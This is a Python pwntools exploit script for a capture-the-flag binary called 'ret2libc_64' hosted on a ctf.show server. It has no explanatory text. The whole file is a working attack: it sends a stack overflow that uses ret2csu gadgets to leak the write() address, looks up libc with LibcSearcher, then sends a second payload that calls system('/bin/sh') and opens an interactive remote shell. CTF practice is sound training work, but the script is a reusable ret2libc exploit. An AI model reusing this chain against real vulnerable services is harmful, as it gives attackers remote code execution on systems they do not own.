from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = 'debug'
context.arch = 'amd64'
#p = process('./ret2libc_64')
p = remote('pwn.challenge.ctf.show',28177)
elf = ELF('ret2libc_64')
got_write = elf.got['write']
got_write = elf.got['write']
start = elf.symbols['_start']  
pop_rdi_ret = 0x04006c3
ret_addr = 0x004004a9
gadget1 = 0x4006b6
gadget2 = 0x04006A0
payload1 = 'b'*0xa8+p64(gadget1)+p64(0)+p64(0)+p64(1)+p64(got_write)+p64(8)+p64(got_write)+p64(1)+p64(gadget2)+'a'*56+ p64(start)
p.sendlineafter('now,Try Pwn Me?\n',payload1)
write_addr = u64(p.recv(6).ljust(8,b'\x00'))
libc = LibcSearcher('write', write_addr)
libcbase = write_addr-libc.dump('write')
system_addr = libcbase+libc.dump('system')
binsh_addr=libcbase+libc.dump("str_bin_sh")
payload2 = 'a'*0xa8+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)
p.sendlineafter('now,Try Pwn Me?\n',payload2)
p.interactive()
